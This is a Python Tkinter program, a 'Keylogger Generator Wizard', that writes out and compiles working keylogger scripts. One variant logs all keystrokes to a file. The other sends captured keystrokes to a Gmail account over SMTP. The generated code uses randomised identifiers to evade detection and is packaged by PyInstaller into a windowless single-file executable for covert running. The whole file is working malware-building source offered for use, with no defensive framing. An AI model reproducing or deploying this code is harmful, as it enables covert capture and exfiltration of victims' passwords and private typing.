import tkinter as tk
from tkinter import messagebox
import subprocess
from datetime import datetime
import random
import string
from PIL import Image, ImageTk

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=1) + random.choices(string.ascii_letters + string.digits, k=length-1))

def save_input_email_keylogger():
    user_input_1 = entry_1.get()
    user_input_2 = entry_2.get()
    
    question_email_1 = messagebox.askyesno("Verify", f"Verify the information:\nEmail: {user_input_1}\nApp-Password: {user_input_2}")

    if question_email_1:

        # Generate a unique identifier based on the current date and time
        unique_id = datetime.now().strftime("%Y%m%d%H%M%S")
        script_filename = f'email-keylogger-{unique_id}.py'
        
        # Generate random variable names
        email_var = generate_random_string()
        password_var = generate_random_string()
        log_var = generate_random_string()
        send_log_func = generate_random_string()
        on_press_func = generate_random_string()
        listener = generate_random_string()
        key = generate_random_string()
        time_lib = generate_random_string()


        # Generate keylogger script       
        with open(script_filename, 'w') as eKeylog:
            eKeylog.write(f"""import smtplib
import time as {time_lib}
from pynput.keyboard import Listener as {listener}

{email_var} = '{user_input_1}'
{password_var} = '{user_input_2}'

{log_var} = ""

def {send_log_func}():
    global {log_var}
    if {log_var}:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login({email_var}, {password_var})
            server.sendmail({email_var}, {email_var}, {log_var})
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {{e}}")
        {log_var} = ""

def {on_press_func}({key}):
    global {log_var}
    {log_var} += str({key})
    if len({log_var}) > 100:  # Send email if log length exceeds 100 characters
        {send_log_func}()

with {listener}(on_press={on_press_func}) as {listener}:
    while True:
        {time_lib}.sleep(60)
        {send_log_func}()
        {listener}.join()""")

        messagebox.showinfo("Info", f"The program has generated a script for you: {script_filename}")

        convert_to_exe(script_filename)

def on_button_click_email_keylogger():
    global entry_1, entry_2

    disable_other_buttons("email")

    tk.Label(root, text="Type your Gmail address", font=("Helvetica, 10")).place(relx=0.6, rely=0.3, anchor="center")
    entry_1 = tk.Entry(root, width=30)
    entry_1.place(relx=0.6, rely=0.4, anchor="center")

    tk.Label(root, text="Enter your app-password", font=("Helvetica, 10")).place(relx=0.6, rely=0.5, anchor="center")
    entry_2 = tk.Entry(root, width=30)
    entry_2.place(relx=0.6, rely=0.6, anchor="center")

    save_button_email_keylogger = tk.Button(root, text="Generate", font=("Helvetica, 10"),command=save_input_email_keylogger)
    save_button_email_keylogger.place(relx=0.6, rely=0.7, anchor="center")

def on_button_click_simple_keylogger():
    disable_other_buttons("simple")
    
    # Generate a unique identifier based on the current date and time
    unique_id = datetime.now().strftime("%Y%m%d%H%M%S")
    script_filename = f'simple-keylogger-{unique_id}.py'

    # Generate random variable names
    writetofile_func = generate_random_string()
    keydata_var = generate_random_string()
    keylog_var = generate_random_string()
    keylogtextfile = generate_random_string()
    listener = generate_random_string()
    key = generate_random_string()

    with open(script_filename, 'w') as SKeylog:
        SKeylog.write(f"""from pynput.keyboard import Listener as {listener}
def {writetofile_func}({key}):
    {keydata_var} = str({key})
    with open('{keylogtextfile}.txt', 'a') as {keylog_var}:
        {keylog_var}.write({keydata_var})

with {listener}(on_press={writetofile_func}) as {listener}:
    {listener}.join()
""")
        
    messagebox.showinfo("Info", f"Simple keylogger has been successfully created: {script_filename}")

    convert_to_exe(script_filename)
    enable_buttons("end")

def convert_to_exe(script_name):
    response = messagebox.askyesno("Convert to EXE", f"Do you want to convert {script_name} to an executable (EXE) file?")
    
    if response:
        subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--noconsole', script_name])        
        messagebox.showinfo("Info", f"{script_name} has been successfully converted to exe :)")

def disable_other_buttons(selected_button):
    if selected_button == "simple":
        keylogger_button_1.config(state="disabled")
    if selected_button == "email":
        keylogger_button_2.config(state="disabled")

def enable_buttons(selected_button):
    if selected_button == "end":
        keylogger_button_1.config(state="normal")
        keylogger_button_2.config(state="normal")

# Init Tkinter
root = tk.Tk()
root.title("Keylogger Generator Wizard")
root.geometry("600x400")
root.resizable(width=False, height=False)

# Load the background image
bg_image = Image.open("images/bgimg.jpg")

bg_image = bg_image.resize((600, 400), Image.LANCZOS)

bg_photo = ImageTk.PhotoImage(bg_image)

bg_label = tk.Label(root, image=bg_photo)
bg_label.place(relwidth=1, relheight=1)

# --- Keylogger Wizard Widgets --- 
tk.Label(root, text="Keylogger Generator Wizard", font=('Helvetica', 12), bg="#f0f0f0").place(relx=0.5, rely=0.1, anchor="center")

# - Simple Keylogger Widgets -
keylogger_button_1 = tk.Button(root, text="Simple Keylogger", font=('Helvetica', 10), command=on_button_click_simple_keylogger, bg="white", fg="black")
keylogger_button_1.place(relx=0.3, rely=0.2, anchor="center")

# - Email Keylogger Widgets -
keylogger_button_2 = tk.Button(root, text="Email Keylogger", font=('Helvetica', 10), command=on_button_click_email_keylogger, bg="white", fg="black")
keylogger_button_2.place(relx=0.6, rely=0.2, anchor="center")

root.mainloop()
